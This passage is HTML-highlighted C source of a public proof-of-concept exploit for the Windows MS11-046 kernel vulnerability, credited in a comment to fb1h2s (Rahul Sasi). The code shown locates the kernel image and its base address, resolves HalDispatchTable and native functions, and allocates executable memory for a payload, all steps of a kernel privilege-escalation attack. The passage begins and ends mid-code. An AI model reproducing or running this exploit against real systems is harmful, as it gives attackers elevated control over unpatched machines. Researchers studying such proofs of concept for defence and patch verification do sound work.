#0000BB">IN&nbsp;ULONG&nbsp;SystemInformationLength</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">OUT&nbsp;PULONG&nbsp;ReturnLength</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">typedef&nbsp;enum&nbsp;_KPROFILE_SOURCE&nbsp;</span><span style="color: #007700">{<br /><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileTime</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileAlignmentFixup</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileTotalIssues</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfilePipelineDry</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileLoadInstructions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfilePipelineFrozen</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileBranchInstructions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileTotalNonissues</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileDcacheMisses</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileIcacheMisses</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileCacheMisses</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileBranchMispredictions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileStoreInstructions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileFpInstructions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileIntegerInstructions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Profile2Issue</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Profile3Issue</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Profile4Issue</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileSpecialInstructions</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileTotalCycles</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileIcacheIssues</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileDcacheAccesses</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileMemoryBarrierCycles</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileLoadLinkedIssues</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ProfileMaximum<br /><br /></span><span style="color: #007700">}&nbsp;</span><span style="color: #0000BB">KPROFILE_SOURCE</span><span style="color: #007700">,&nbsp;*</span><span style="color: #0000BB">PKPROFILE_SOURCE</span><span style="color: #007700">;<br /><br /><br /></span><span style="color: #0000BB">typedef&nbsp;DWORD&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">WINAPI&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">PNTQUERYINTERVAL</span><span style="color: #007700">)(&nbsp;</span><span style="color: #0000BB">KPROFILE_SOURCE&nbsp;ProfileSource</span><span style="color: #007700">,</span><span style="color: #0000BB">PULONG&nbsp;Interval&nbsp;</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">typedef&nbsp;NTSTATUS&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">WINAPI&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">PNTALLOCATE</span><span style="color: #007700">)(&nbsp;</span><span style="color: #0000BB">IN&nbsp;HANDLE&nbsp;ProcessHandle</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;OUT&nbsp;PVOID&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">BaseAddress</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;ULONG&nbsp;ZeroBits</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;OUT&nbsp;PULONG&nbsp;RegionSize</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;ULONG&nbsp;AllocationType</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;ULONG&nbsp;Protect&nbsp;</span><span style="color: #007700">);<br /><br /><br /><br /><br /></span><span style="color: #0000BB">int&nbsp;main</span><span style="color: #007700">()&nbsp;{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//All&nbsp;the&nbsp;declarations&nbsp;goes&nbsp;here<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">PNTQUERYINTERVAL&nbsp;ZwQueryIntervalProfile</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">PNTALLOCATE&nbsp;ZwAllocateVirtualMemory</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">KPROFILE_SOURCE&nbsp;stProfile&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ProfileTotalIssues</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ULONG&nbsp;Ret_size</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">NTSTATUS&nbsp;status</span><span style="color: #007700">,</span><span style="color: #0000BB">alloc_status&nbsp;</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ULONG&nbsp;i</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">n</span><span style="color: #007700">,&nbsp;*</span><span style="color: #0000BB">q</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">PSYSTEM_MODULE_INFORMATION&nbsp;p</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">base</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">WSADATA&nbsp;wsaData</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">SOCKET&nbsp;ConnectSocket&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">INVALID_SOCKET</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;iResult</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">DWORD&nbsp;ibuf&nbsp;</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0x30</span><span style="color: #007700">&#93;;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">DWORD&nbsp;obuf&nbsp;</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0x30</span><span style="color: #007700">&#93;;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ULONG_PTR&nbsp;result</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">hints</span><span style="color: #007700">.</span><span style="color: #0000BB">ai_family&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">AF_UNSPEC</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">hints</span><span style="color: #007700">.</span><span style="color: #0000BB">ai_socktype&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">SOCK_STREAM</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">hints</span><span style="color: #007700">.</span><span style="color: #0000BB">ai_protocol&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">IPPROTO_TCP</span><span style="color: #007700">;<br /><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&nbsp;&#91;+&#93;&nbsp;MS11-046&nbsp;Exploit&nbsp;by&nbsp;fb1h2s(Rahul&nbsp;Sasi)&nbsp;"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">/*<br />MS11-046&nbsp;Was&nbsp;a&nbsp;Zero&nbsp;day&nbsp;found&nbsp;in&nbsp;the&nbsp;wild&nbsp;,&nbsp;reported&nbsp;to&nbsp;MS&nbsp;by<br /><br />Steven&nbsp;Adair&nbsp;from&nbsp;the&nbsp;Shadowserver&nbsp;Foundation&nbsp;and&nbsp;Chris&nbsp;S&nbsp;.<br /><br />Ronnie&nbsp;Johndas&nbsp;wrote&nbsp;the&nbsp;writeup&nbsp;dissecting&nbsp;a&nbsp;malware&nbsp;with&nbsp;the&nbsp;exploit&nbsp;details&nbsp;.<br /><br />I&nbsp;Rahul&nbsp;Sasi(fb1h2s)&nbsp;just&nbsp;made&nbsp;the&nbsp;POC&nbsp;exploit&nbsp;available&nbsp;.<br /><br />Reference:&nbsp;ms8_66,&nbsp;ms6_49&nbsp;http://www.whitecell.org/list.php?id=50&nbsp;exp&nbsp;codes<br /><br />*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">status&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ZwQuerySystemInformation</span><span style="color: #007700">(</span><span style="color: #0000BB">SystemModuleInformation</span><span style="color: #007700">,&nbsp;&amp;</span><span style="color: #0000BB">n</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">,&nbsp;&amp;</span><span style="color: #0000BB">n</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">q&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">ULONG&nbsp;</span><span style="color: #007700">*)</span><span style="color: #0000BB">malloc</span><span style="color: #007700">(</span><span style="color: #0000BB">n&nbsp;</span><span style="color: #007700">*&nbsp;</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(*</span><span style="color: #0000BB">q</span><span style="color: #007700">));<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">q&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">perror</span><span style="color: #007700">(</span><span style="color: #DD0000">"malloc"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">status&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ZwQuerySystemInformation</span><span style="color: #007700">(</span><span style="color: #0000BB">SystemModuleInformation</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">q</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">n&nbsp;</span><span style="color: #007700">*&nbsp;</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(*</span><span style="color: #0000BB">q</span><span style="color: #007700">),&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">p&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">PSYSTEM_MODULE_INFORMATION</span><span style="color: #007700">)(</span><span style="color: #0000BB">q&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">base&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Loop&nbsp;Loop&nbsp;The&nbsp;table&nbsp;and&nbsp;check&nbsp;for&nbsp;our&nbsp;krl<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;(</span><span style="color: #0000BB">i&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">i&nbsp;</span><span style="color: #007700">&lt;&nbsp;*</span><span style="color: #0000BB">q</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">i</span><span style="color: #007700">++)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(&nbsp;</span><span style="color: #0000BB">strstr</span><span style="color: #007700">(</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">ImageName</span><span style="color: #007700">,</span><span style="color: #DD0000">"ntkrnlpa.exe"</span><span style="color: #007700">)&nbsp;)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&nbsp;&#91;+&#93;&nbsp;Yo&nbsp;Yo&nbsp;found,&nbsp;and&nbsp;am&nbsp;In&nbsp;ntkrnlpa.exe&nbsp;\n"</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">krl_addr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">LoadLibraryExA</span><span style="color: #007700">(</span><span style="color: #DD0000">"ntkrnlpa.exe"</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,</span><span style="color: #0000BB">1</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\t&nbsp;Base:&nbsp;0x%x&nbsp;size:&nbsp;%u\t%s\n"</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">Base</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">Size</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">ImageName</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">krl_base&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">Base</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if(</span><span style="color: #0000BB">strstr</span><span style="color: #007700">(</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">ImageName</span><span style="color: #007700">,</span><span style="color: #DD0000">"ntoskrnl.exe"</span><span style="color: #007700">))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&nbsp;&#91;+&#93;&nbsp;Yo&nbsp;Yo&nbsp;found,&nbsp;and&nbsp;am&nbsp;In&nbsp;ntoskrnl.exe\n"</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">krl_addr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">LoadLibraryExA</span><span style="color: #007700">(</span><span style="color: #DD0000">"ntoskrnl.exe"</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,</span><span style="color: #0000BB">1</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\t&nbsp;Base&nbsp;Adress:&nbsp;0x%x&nbsp;"</span><span style="color: #007700">,</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">Base</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">krl_base&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">p</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">i</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">Base</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&nbsp;&#91;+&#93;Cdnt&nbsp;find,&nbsp;and&nbsp;am&nbsp;out\n"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(</span><span style="color: #0000BB">0</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">free</span><span style="color: #007700">(</span><span style="color: #0000BB">q</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&#91;+&#93;&nbsp;Continue&nbsp;with&nbsp;Exploitation\n"</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">HalDispatchTable&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">ULONG_PTR</span><span style="color: #007700">)</span><span style="color: #0000BB">GetProcAddress</span><span style="color: #007700">(</span><span style="color: #0000BB">krl_addr</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #DD0000">"HalDispatchTable"</span><span style="color: #007700">);<br /><br />&nbsp;if(&nbsp;!</span><span style="color: #0000BB">HalDispatchTable&nbsp;</span><span style="color: #007700">)<br />&nbsp;{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;!!&#93;&nbsp;Sh*t&nbsp;happen&nbsp;with&nbsp;HalDispatchTablen"</span><span style="color: #007700">);<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">FALSE</span><span style="color: #007700">;<br />&nbsp;}<br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\tBase&nbsp;Nt=:&nbsp;0x%x&nbsp;"</span><span style="color: #007700">,</span><span style="color: #0000BB">krl_base</span><span style="color: #007700">);<br />&nbsp;</span><span style="color: #0000BB">HalDispatchTable&nbsp;</span><span style="color: #007700">-=&nbsp;(&nbsp;</span><span style="color: #0000BB">ULONG_PTR&nbsp;</span><span style="color: #007700">)</span><span style="color: #0000BB">krl_addr</span><span style="color: #007700">;<br />&nbsp;</span><span style="color: #0000BB">HalDispatchTable&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">krl_base</span><span style="color: #007700">;<br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&#91;+&#93;&nbsp;HalDispatchTable&nbsp;found&nbsp;\t\t\t&nbsp;&#91;&nbsp;0x%p&nbsp;&#93;\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">HalDispatchTable</span><span style="color: #007700">);<br /><br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;ZwQueryIntervalProfile&nbsp;"</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">ZwQueryIntervalProfile&nbsp;</span><span style="color: #007700">=&nbsp;(&nbsp;</span><span style="color: #0000BB">PNTQUERYINTERVAL&nbsp;</span><span style="color: #007700">)&nbsp;</span><span style="color: #0000BB">GetProcAddress</span><span style="color: #007700">(</span><span style="color: #0000BB">GetModuleHandle</span><span style="color: #007700">(</span><span style="color: #DD0000">"ntdll.dll"</span><span style="color: #007700">),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #DD0000">"ZwQueryIntervalProfile"</span><span style="color: #007700">);<br />&nbsp;if(&nbsp;!</span><span style="color: #0000BB">ZwQueryIntervalProfile&nbsp;</span><span style="color: #007700">)<br />&nbsp;{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;!!&#93;&nbsp;Sh*t&nbsp;happen&nbsp;resolving&nbsp;ZwQueryIntervalProfile\n"</span><span style="color: #007700">);<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">FALSE</span><span style="color: #007700">;<br />&nbsp;}<br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(&nbsp;</span><span style="color: #DD0000">"\t\t\t&nbsp;&#91;&nbsp;0x%p&nbsp;&#93;\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">ZwQueryIntervalProfile&nbsp;</span><span style="color: #007700">);<br /><br /><br /><br /></span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;ZwAllocateVirtualMemory"</span><span style="color: #007700">);<br /><br /><br />&nbsp;</span><span style="color: #0000BB">ZwAllocateVirtualMemory&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">PNTALLOCATE</span><span style="color: #007700">)&nbsp;</span><span style="color: #0000BB">GetProcAddress</span><span style="color: #007700">(</span><span style="color: #0000BB">GetModuleHandle</span><span style="color: #007700">(&nbsp;</span><span style="color: #DD0000">"ntdll.dll"</span><span style="color: #007700">),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #DD0000">"ZwAllocateVirtualMemory"</span><span style="color: #007700">);<br /><br />&nbsp;if(&nbsp;!</span><span style="color: #0000BB">ZwAllocateVirtualMemory&nbsp;</span><span style="color: #007700">)<br />&nbsp;{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;!!&#93;&nbsp;Unable&nbsp;to&nbsp;resolve&nbsp;ZwAllocateVirtualMemory\n"</span><span style="color: #007700">);<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">FALSE</span><span style="color: #007700">;<br />&nbsp;}<br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(&nbsp;</span><span style="color: #DD0000">"\t\t\t&nbsp;&#91;&nbsp;0x%p&nbsp;&#93;\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">ZwAllocateVirtualMemory&nbsp;</span><span style="color: #007700">);<br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n&#91;+&#93;&nbsp;Allocating&nbsp;memory&nbsp;at&nbsp;&#91;&nbsp;0x%p&nbsp;&#93;...\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">hexcode_addr</span><span style="color: #007700">);<br /><br />&nbsp;</span><span style="color: #0000BB">alloc_status&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ZwAllocateVirtualMemory</span><span style="color: #007700">(&nbsp;</span><span style="color: #0000BB">INVALID_HANDLE_VALUE</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;</span><span style="color: #0000BB">hexcode_addr</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;</span><span style="color: #0000BB">sizeofshell</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">MEM_RESERVE</span><span style="color: #007700">|</span><span style="color: #0000BB">MEM_COMMIT</span><span style="color: #007700">|</span><span style="color: #0000BB">MEM_TOP_DOWN</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">PAGE_EXECUTE_READWRITE&nbsp;</span><span style="color: #007700">);<br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: 